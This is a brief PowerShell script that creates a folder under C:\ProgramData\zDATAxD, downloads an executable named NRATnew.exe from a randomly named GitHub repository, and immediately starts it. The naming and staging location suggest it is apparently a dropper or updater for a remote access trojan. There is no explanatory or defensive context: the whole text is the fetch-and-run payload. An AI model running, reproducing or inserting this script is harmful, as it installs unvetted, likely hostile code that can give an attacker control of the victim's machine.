cd C:\ProgramData\zDATAxD
md nratmyupdate
cd nratmyupdate
$source = 'https://raw.githubusercontent.com/ErrorLoadingUsername-404/320rk49asrotji4ejtrsltj3o4t34t/main/NRATnew.exe'
$destination = 'C:\ProgramData\zDATAxD\nratmyupdate\NRATnew.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
start NRATnew.exe